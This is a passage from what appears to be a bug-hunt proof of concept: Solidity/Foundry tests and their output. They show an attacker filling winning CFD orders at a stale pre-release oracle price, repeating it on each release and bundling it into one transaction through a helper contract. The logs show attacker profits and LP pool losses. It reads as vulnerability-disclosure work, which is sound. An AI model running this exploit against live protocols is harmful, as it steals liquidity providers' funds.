            if (moves[i] <= -12 || moves[i] >= 15) assertGt(a, 0, "above break-even");
            if (moves[i] == -8) assertLt(a, 0, "below break-even");
        }
    }

    /// Three releases one hour apart (-25, +30, -20 bps), orders of 3,800,000 USDG to stay under the skew cap.
    function test_RepeatsOnEveryRelease() public {
        ticketSize = 3_800_000e18;
        _prepare();
        int256[3] memory moves = [int256(-25), int256(30), int256(-20)];
        int256 previous;
        for (uint256 i; i < 3; i++) {
            release = FIRST_RELEASE + i * 1 hours;
            (int256 a, int256 aLp) = _round(moves[i], true);
            _log("cumulative after release", moves[i], a, aLp);
            assertGt(a, previous + 3_000e6, "every release adds profit");
            previous = a;
            priceBefore = _priceAfter(moves[i]);
        }
        assertGt(previous, 15_000e6);
    }

    /// Accounts can be contracts: enable, fill and drop in one transaction at T+1.
    function test_ContractAccountDoesItInOneTransaction() public {
        acctLong = address(new SmartTradingAccount(router, engine));
        acctShort = address(new SmartTradingAccount(router, engine));
        _prepare();
        (uint64 idLong, uint64 idShort) = _commitTickets(true);
        _goTo(release + 1); // basket fell 25 bps at T: LONG wins
        bytes[] memory fillTick = _tick(priceBefore, release - 1);
        uint256 fee = router.pletherOracle().getOrderExecutionFee(fillTick);
        SmartTradingAccount(payable(acctLong)).enableFillDrop{value: 2 * fee}(GATE_TOPUP, idLong, idShort, fillTick, fee);
        _nextBlock();
        (int256 a, int256 aLp) = _closeAll(_priceAfter(-25), false);
        _log("contract account, one transaction", -25, a, aLp);
        assertGt(a, 5_000e6);
    }

}

/// @dev Minimal smart trading account used by the last test.
contract SmartTradingAccount {

    OrderRouter internal immutable ROUTER;
    CfdEngine internal immutable ENGINE;
    address internal immutable OWNER;

    constructor(
        OrderRouter router_,
        CfdEngine engine_
    ) {
        (ROUTER, ENGINE, OWNER) = (router_, engine_, msg.sender);
    }

    function enableFillDrop(
        uint256 topUp,
        uint64 fillId,
        uint64 dropId,
        bytes[] calldata data,
        uint256 fee
    ) external payable {
        require(msg.sender == OWNER, "owner");
        ENGINE.addMargin(address(this), topUp);
        OrderV3Types.ExecutionResult memory r = ROUTER.executeOrder{value: fee}(fillId, data);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "fill");
        ROUTER.executeOrder{value: fee}(dropId, data);
    }

    receive() external payable {}

}
```

Output (compiler warnings elided):

```text
Ran 5 tests for test/poc/hunt-zi01v/ProofOwnerGatedLookBackFill.t.sol:ProofOwnerGatedLookBackFill
[PASS] test_BreakEvenSweep() (gas: 76718910)
Logs:
  attack
    basket move at the release, bps: -50
    attacker P&L, USDG: 15920
    LP pool delta, USDG: -17523
  attack
    basket move at the release, bps: 50
    attacker P&L, USDG: 15979
    LP pool delta, USDG: -17582
  attack
    basket move at the release, bps: -15
    attacker P&L, USDG: 1970
    LP pool delta, USDG: -3573
  attack
    basket move at the release, bps: 15
    attacker P&L, USDG: 1984
    LP pool delta, USDG: -3588
  attack
    basket move at the release, bps: -12
    attacker P&L, USDG: 774
    LP pool delta, USDG: -2377
  attack
    basket move at the release, bps: -10
    attacker P&L, USDG: -22
    LP pool delta, USDG: -1580
  attack
    basket move at the release, bps: -8
    attacker P&L, USDG: -819
    LP pool delta, USDG: -783

[PASS] test_ContractAccountDoesItInOneTransaction() (gas: 12526413)
Logs:
  contract account, one transaction
    basket move at the release, bps: -25
    attacker P&L, USDG: 5956
    LP pool delta, USDG: -7559

[PASS] test_OwnerEnablesWinnerAndKeeperFillsIt() (gas: 45154987)
Logs:
  pool assets before, USDG: 10002000
  attack: addMargin at T+1, keeper batch fills the winner at the T-1 price
    basket move at the release, bps: -25
    attacker P&L, USDG: 5956
    LP pool delta, USDG: -7559
  control: same orders and keeper timing, no bound
    basket move at the release, bps: -25
    attacker P&L, USDG: -8040
    LP pool delta, USDG: 3241
  attack: addMargin at T+1, keeper batch fills the winner at the T-1 price
    basket move at the release, bps: 25
    attacker P&L, USDG: 5983
    LP pool delta, USDG: -7586
  control: same orders and keeper timing, no bound
    basket move at the release, bps: 25
    attacker P&L, USDG: -8064
    LP pool delta, USDG: 3257

[PASS] test_RepeatsOnEveryRelease() (gas: 32845000)
Logs:
  cumulative after release
    basket move at the release, bps: -25
    attacker P&L, USDG: 5660
    LP pool delta, USDG: -7183
  cumulative after release
    basket move at the release, bps: 30
    attacker P&L, USDG: 13222
    LP pool delta, USDG: -16265
  cumulative after release
    basket move at the release, bps: -20
    attacker P&L, USDG: 16992
    LP pool delta, USDG: -21558

[PASS] test_ThirdPartyExecutionOnlyCancels() (gas: 8816982)
Logs:
  cost of two cancelled 4,000,000 USDG orders, USDG atoms: 400000

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 150.76ms (322.26ms CPU time)

Ran 1 test suite in 151.75ms (150.76ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

